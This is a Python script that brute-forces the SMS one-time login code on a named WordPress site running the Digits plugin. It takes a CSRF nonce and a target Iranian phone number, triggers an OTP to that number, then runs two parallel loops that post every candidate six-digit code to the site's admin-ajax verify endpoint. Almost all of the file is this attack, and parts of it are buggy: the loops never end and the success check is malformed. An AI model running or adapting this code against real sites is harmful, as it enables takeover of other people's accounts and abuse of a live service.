from multiprocessing import Process
import time
import requests
from colorama import Fore
from os import system
import nonce_cod
system('cls')

print("instaling lib")
system('pip install colorama')
system('pip install requests')
system('cls')

def banner():
    print(Fore.BLUE+"""
            ███                      █████                       █████     
           ░░░                      ░░███                       ░░███      
 ████████  ████  ████████   ██████   ░███████   ██████   ██████  ░███ █████
░░███░░███░░███ ░░███░░███ ░░░░░███  ░███░░███ ███░░███ ███░░███ ░███░░███ 
 ░███ ░░░  ░███  ░███ ░░░   ███████  ░███ ░███░███ ░███░███ ░███ ░██████░  
 ░███      ░███  ░███      ███░░███  ░███ ░███░███ ░███░███ ░███ ░███░░███ 
 █████     █████ █████    ░░████████ ████████ ░░██████ ░░██████  ████ █████
░░░░░     ░░░░░ ░░░░░      ░░░░░░░░ ░░░░░░░░   ░░░░░░   ░░░░░░  ░░░░ ░░░░░ 
                                                                        (c) Rirabook . All rights reserved
                                                                                        V.Multitask""")
banner()
time.sleep(3)

Get_nonce = nonce_cod.nonce(start='')
print(Get_nonce)

dig_nounce = input('nonce code :') #dynamic code [csrf]
phonenum = int(input('Phone number with out +98 :'))


url = 'https://rirabook.com/wp-admin/admin-ajax.php'
json = {'accountkit': 0,
        'firebase': 0,
        'code': "1"}

data = {'action':'digits_check_mob',
        'countrycode':'+98',
        'mobileNo':phonenum,
        'csrf':dig_nounce,
        'login':1,
        'username':'',
        'email':'',
        'captcha':'',
        'captcha_ses':'',
        'digits':1,
        'json':1,
        'whatsapp':0,
        'mobmail':phonenum,
        'dig_otp':'',
        'dig_nounce':dig_nounce,
        'digits_redirect_page':'https://rirabook.com/'}

sned_otp = requests.post(url=url,json=json,data=data).text

if sned_otp == '{"accountkit":0,"firebase":0,"code":"1"}':
    print(Fore.GREEN+'[*] OTP Code Sned phone')
    time.sleep(10)
else:
    print(Fore.RED+'[*] OTP Code Sned Fail')
    time.sleep(5)

#task 1

def task1():
    sh = 999999
    while True:
        sh -= 2

        if sh == 000000:
            print(Fore.RED+'[*] OTP test fail [1]')

        print(Fore.YELLOW+"[*]",sh,"Test OTP Code [1]")
        print('     ')

        url_vrify = 'https://rirabook.com/wp-admin/admin-ajax.php'

        json_vrify = {'success': True,
                      'data': {'code':11}}

        data_vrify = {'action':'digits_verifyotp_login',
                      'countrycode':'%2B98',
                      'mobileNo':phonenum,
                      'otp':sh,
                      'dig_ftoken':-1,
                      'csrf':dig_nounce,
                      'dtype':1,
                      'digits':1,
                      'rememberMe':False}

        Vrify_otp = requests.post(url=url_vrify,data=data_vrify,json=json_vrify).text

    
        if Vrify_otp == "{'success': True,'data': {'code':11}}":
            print(Fore.GREEN+'[*] Phone OTP Code is',sh,'[1]')
            time.sleep(60)
        else:
            print(Fore.RED+'[*] OTP test fail [1]')

            
# task 2

def task2():
    sh = 999998
    while True:
        sh -= 2

        if sh == 000000:
            print(Fore.RED+'[*] OTP test fail [2]')

        print(Fore.YELLOW+"[*]",sh,"Test OTP Code [2]")
        print('     ')

        url_vrify = 'https://rirabook.com/wp-admin/admin-ajax.php'

        json_vrify = {'success': True,
                      'data': {'code':11}}

        data_vrify = {'action':'digits_verifyotp_login',
                      'countrycode':'%2B98',
                      'mobileNo':phonenum,
                      'otp':sh,
                      'dig_ftoken':-1,
                      'csrf':dig_nounce,
                      'dtype':1,
                      'digits':1,
                      'rememberMe':False}

        Vrify_otp = requests.post(url=url_vrify,data=data_vrify,json=json_vrify).text

    
        if Vrify_otp == "{'success': True,'data': {'code':11}}":
            print(Fore.GREEN+'[*] Phone OTP Code is',sh,'[2]')
            time.sleep(60)
        else:
            print(Fore.RED+'[*] OTP test fail [2]')

if __name__ == '__main__':

    p = Process(target=task1)
    p1 = Process(target=task2)
    
    p.start()
    p1.start()
